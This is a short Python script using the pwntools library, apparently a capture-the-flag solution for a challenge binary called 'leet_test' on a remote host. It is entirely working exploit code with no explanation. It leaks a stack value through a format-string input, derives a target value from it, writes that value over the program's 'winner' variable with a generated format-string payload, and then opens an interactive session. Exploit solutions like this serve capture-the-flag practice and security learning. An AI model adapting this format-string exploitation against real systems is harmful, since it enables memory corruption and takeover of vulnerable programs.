from pwn import *

context.binary = exe = ELF('leet_test')

ret = 0x000000000040101a

#io = process()
#gdb.attach(io, api=True)
io = remote('206.189.28.180', 32226)

payload = b'%7$p'
io.sendlineafter(b'name: ', payload)
io.recvuntil(b'0x')
buf = int(io.recvline(False), 16) >> 32
winner = 322420958 * buf

payload = fmtstr_payload(10, {exe.sym['winner']:winner})
io.sendlineafter(b'name: ', payload)
io.interactive()
